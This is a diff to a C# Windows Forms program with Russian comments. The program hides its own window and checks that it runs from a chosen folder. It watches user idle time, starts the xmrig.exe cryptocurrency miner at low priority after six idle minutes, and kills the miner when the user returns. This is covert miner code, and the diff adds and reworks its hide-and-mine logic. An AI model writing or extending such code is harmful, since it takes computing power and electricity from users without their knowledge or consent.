@@ -87,9 +87,9 @@ namespace WindowsFormsApp1
 
             if (hiden == false && progStartName==thisProgrammDirectory)         //если программа в правильном месте
             {
-                LogFile.Log("Is on wright plase.");
-                hiden = true;
                 Hide();         //прячем ее 
+                hiden = true;
+                LogFile.Log("Is on wright plase.");
                 PrepareToWorck();       //начинаем готовить ее к работе
             }
 
@@ -118,7 +118,12 @@ namespace WindowsFormsApp1
 
 
 
-            if (File.Exists(progStartName + @"\setings\redy.txt")) //если программа готова
+            if (progStartName != thisProgrammDirectory) //
+                                                        //если программа готова
+                                                        //сюда нужно вставить значение из конфиг файла
+                                                        //когда я допишу нужный метод
+                                                        //Это пока что просто заглушка
+                                                        //
             {
                 //если значение времени изменилось, то меняем его
                 if (time != DateTime.Now.ToString("HH.mm"))     
@@ -126,23 +131,29 @@ namespace WindowsFormsApp1
                     time = DateTime.Now.ToString("HH.mm");
                 }
 
+                // проверяем, если время больше чем нужно и ничего ещу не включено
                 //60000= 1 минута
-                //if (idleTime >= 3600000 && prog_started == false && time != "00.00")          //60 минут
                 if (idleTime >= 360000 && prog_started == false && time != "00.00")         //6 минут
-                //if (idleTime >= 60000 && prog_started == false && time != "00.00")         //1 минут
                 {
+                    //пишем в лог
                     LogFile.Log("Rig start");
-                    prog_started = true;
+                    // Флаг ставится при запуске метода
+                    //запускаем метод запуска
                     start_prog();
                 }
 
-                //временное изменение
-                //ночью не выключается
-                if (idleTime <= 4000  && prog_started == true && (timeInt > 5 || timeInt < 22))
+                //если время очень мало
+                if (idleTime <= 1000  && prog_started == true)
                 {
+                    //запускаем метод выключения
+                    //флаг ставится в методе, после выполнения
                     close_prog();
                 }
 
+                /*
+                 * это все должно было запускать рестарт программы, но...
+                 * Но надо это всё переписать
+                 * 
                 if (time == "00.00" && !File.Exists(thisProgrammDirectory + @"/restart.txt"))
                 {
                     File.Create(thisProgrammDirectory + @"/restart.txt");
@@ -165,100 +176,67 @@ namespace WindowsFormsApp1
                     prog_started = true;
                     start_prog();
                 }
+                */
 
                 if (checkBox1.Checked == true)      //проверяет показывать ли в текствоксе когда пользователь ёрзает
                 {
                     if (idleTime <= 100 && idleTimeOld >= 1000 && prog_started == false)
                     {
+                        //эта функция должна была выводить всё в текстбокс на форме
+                        //и она выводила.
                         printString(DateTime.Now.ToString("HH.mm.ss") + " Last input.", true);
                     }
                     idleTimeOld = idleTime;
                 }
             }
-            else 
+            else    //если программа не готова
             {
+                //ставлю счётчик на пару секунд
                 timeInt = Convert.ToInt32(DateTime.Now.ToString("ss"));
 
+                // Когда счётчик доходит до конца надо что-то сделать.
+                // Я пока что просто запускаю эту прогу, открываю папку с ней и включаю прогу из нового места
                 if (idleTimeOld <= 57)
                 {
                     if (idleTimeOld == timeInt-3)
-                    { /*
-                        System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
-                        srartProg.StartInfo.FileName = @"C:\Users\Public\Favor\" + System.AppDomain.CurrentDomain.FriendlyName;
-                        srartProg.Start();
-                        */
-                        //Environment.Exit(0);
-                        File.Create(progStartName + @"\setings\redy.txt");
-                        //this.Close();
-
-
-
+                    { 
                         //пока выключил
                         //Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
                         //Process.Start(@"C:\Users\Public\Favor\start.bat");
 
-
-
-
-                        //Environment.Exit(0);
-                        //this.Close();
-                        // Environment.Exit(0);  C:\Users\Public\Favor
-
                         Process.GetCurrentProcess().Kill();
-
-                        //System.Diagnostics.Process.Start("explorer", progStartName);
                     }
                 }
                 else
                 {
-                    //printInt(idleTimeOld + "  " + time, false);
                     if (timeInt == 2)
-                    { /*
-                        System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
-                        srartProg.StartInfo.FileName = @"C:\Users\Public\Favor\" + System.AppDomain.CurrentDomain.FriendlyName;
-                        srartProg.Start();
-                        */
-                        //Environment.Exit(0);
-                        File.Create(progStartName + @"\setings\redy.txt");
-                        //this.Close();
-                        //Process.Start(@"C:\Users\Public\Favor\explorer.exe");
-
-
-
+                    { 
                         //пока выключил
                         //Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
                         //Process.Start(@"C:\Users\Public\Favor\start.bat");
-
-
-
-
-                        //Environment.Exit(0);
-                        //this.Close();
-
                         Process.GetCurrentProcess().Kill();
-
                     }
                 }
             }
         }
 
 
-
-
-
-
-
         private void start_prog()
         {
+            //ставим флаг, что прога включается
+            prog_started = true;
             try
             {
+                //создаём экземпляр процесса, чтобы запустить прогу
                 System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
+                //задаём путь и имя до проги
                 srartProg.StartInfo.FileName = rigDirectory+ @"\xmrig.exe";
+                //запускаем саму прогу
                 srartProg.Start();
+                //возьмём уникальный код проги, чтобы её наути
                 rigID = srartProg.Id;
+                //задаем приоритет проги
                 Process.GetProcessById(rigID).PriorityClass = ProcessPriorityClass.BelowNormal;
-                prog_started = true;
-                
             }
             catch //(Exception ex)
             {
@@ -284,6 +262,7 @@ namespace WindowsFormsApp1
                         processList[i].Kill();
                         i++;
                     }
+                    prog_started = false;
                 }
                 else
                 {
